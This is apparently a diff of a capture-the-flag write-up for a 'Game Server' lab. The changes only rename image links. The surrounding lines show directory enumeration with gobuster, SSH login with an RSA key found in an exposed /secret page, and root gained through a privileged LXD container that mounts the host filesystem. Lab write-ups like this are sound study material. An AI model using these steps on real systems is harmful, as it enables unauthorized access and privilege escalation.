@@ -1817,7 +1817,7 @@ cd /root
 cat root.txt
 ```
 
-![enum result](Assets/101.png)
+![enum result](NPT/Assets/101.png)
 
 ## 11. Game Server
 
@@ -1833,13 +1833,13 @@ gobuster dir -u <URL> -w <wordlist>
 
 We found a page called /uploads
 
-![[THM/Assets/9.png]]
+![[109.png]]
 
 We found 3 things in that which are dict1.lst -> dictionary, manifesto -> waste thing and third being an image called meme.jpg
 
 We also found another file called /secret
 
-![[THM/Assets/10.png]]
+![[110.png]]
 
 I found its rsa key so let us login, save name as id_rsa
 
@@ -1865,7 +1865,7 @@ chmod 600 id_rsa
 ssh -i id_rsa john@<IP>
 ```
 
-![[Pasted image 20260226114835.png]]
+![[111.png]]
 
 Now we are logged in as john
 
@@ -1923,7 +1923,7 @@ lxc import image alpine-v3.23-x86_64-20260225_2113.tar.gz --alias alpine
 lxc init alpine privesc -c security.privileged=true
 ```
 
-![[Pasted image 20260227170700.png]]
+![[112.png]]
 
 ```
 lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
@@ -1937,7 +1937,7 @@ lxc start privesc
 lxc exec privesc /bin/sh
 ```
 
-![[Pasted image 20260227171056.png]]
+![[113.png]]
 
 Now we are root
 
